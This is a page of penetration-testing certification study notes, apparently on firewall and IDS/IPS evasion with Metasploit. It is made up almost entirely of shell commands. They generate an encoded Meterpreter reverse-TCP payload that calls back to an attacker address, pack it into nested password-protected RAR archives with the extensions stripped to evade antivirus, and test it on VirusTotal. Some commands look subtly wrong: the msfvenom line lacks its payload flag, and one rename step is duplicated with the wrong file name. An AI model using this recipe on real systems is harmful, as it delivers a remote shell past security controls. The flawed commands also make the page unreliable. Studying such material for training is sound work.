> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/using-metasploit-framework/firewall-and-ids-ips-evasion.md).

# Firewall and IDS/IPS Evasion

* **Generating Payload**

```sh
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

* **Archiving the Payload - Winrar**

```sh
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
```

* **Removing the .RAR Extension**

```sh
mv test.rar test
ls
```

* **Archiving the Payload Again**

```sh
rar a test2.rar -p test
```

* **Removing the .RAR Extension**

```sh
mv test.rar test
ls
```

* O arquivo test2 é o arquivo .rar final com a extensão (.rar) deletada do nome. Depois disso, podemos prosseguir para carregá-lo no VirusTotal para outra verificação.

```sh
msf-virustotal -k <API key> -f test2
```
